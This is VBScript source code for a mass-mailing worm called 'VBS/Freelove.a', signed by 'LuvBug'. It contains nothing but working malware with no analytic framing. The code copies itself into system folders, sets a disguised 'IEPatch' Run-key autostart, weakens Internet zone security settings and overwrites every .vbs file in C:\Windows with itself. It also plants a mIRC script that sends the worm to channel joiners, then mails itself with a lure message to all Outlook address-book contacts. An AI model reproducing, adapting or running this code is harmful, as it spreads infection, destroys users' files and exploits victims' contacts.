Sub FREELOVE()
On Error Resume Next
Dim X, T, Path1, Path2
Set X = CreateObject("Scripting.FileSystemObject")
Set T = CreateObject("Scripting.FileSystemObject")
Path1 = "c:\Windows\Freelove.vbs"
Path2 = "c:\Freelove.vbs"

Dim W, N, file1, file2
Set W = CreateObject("Scripting.FileSystemObject")
Set file1 = W.GetFile(WScript.ScriptFullName)
Set file2 = W.GetFile(WScript.ScriptFullName)
file1.copy (path1)
file2.copy (path2)

Set N = CreateObject("WScript.Shell")
N.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\IEPatch", Path1
N.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\MinLevel", 65536, "REG_DWORD"
N.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\CurrentLevel", 65536, "REG_DWORD"


Dim S, J, R, A, B
Set S = CreateObject("Scripting.FileSystemObject")
Set J = S.OpenTextFile(WScript.ScriptFullName, 1)
H = J.ReadAll
Set R = S.GetFolder("c:\Windows")
Set A = R.Files
For each target in a
ExtName = lcase(S.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set B = S.OpenTextFile(target.path, 2, True)
B.write H
B.close
end if
next

Dim Z, f1, ts
Const ForWriting = 2
Set Z = CreateObject("Scripting.FileSystemObject")
Z.CreateTextFile ("c:\mirc\script.ini")
Set f1 = Z.GetFile("c:\mirc\script.ini")
Set text = f1.OpenAsTextStream(ForWriting, False)
text.write "[script]" & vbCrLf
text.write "n0=on 1:join:#:if ($nick == $me) halt | else dcc send $nick " & Path1 & vbCrLf
text.Close

Dim vbsOutlook, vbsMapi, vbsMail, vbsAddrbook, vbsMailAddr
Set vbsOutlook = CreateObject("Outlook.Application")
Set vbsMapi = vbsOutlook.GetNameSpace("MAPI")
vbsMapi.Logon "profile", "password"
For y = 1 To vbsMapi.AddressLists.Count
Set vbsAddrbook = vbsMapi.AddressLists(y)
x = 1
Set vbsMail = vbsOutlook.CreateItem(0)
For oo = 1 To vbsAddrbook.AddressEntries.Count
vbsMailAddr = vbsAddrbook.AddressEntries(x)
vbsMail.Recipients.Add vbsMailAddr
x = x + 1
Next 
vbsMail.Subject = "Important Notice From " & Application.UserName
vbsMail.Body = "Heya, check out the attachment attached to this email asap!"
vbsMail.Attachments.Add WScript.ScriptFullName
vbsMail.DeleteAfterSubmit = False
vbsMail.Send
vbsMailaddr = ""
vbsMapi.Logoff
Next

End Sub
FREELOVE()

'******************
'The VBS/Freelove.a
'By LuvBug
'******************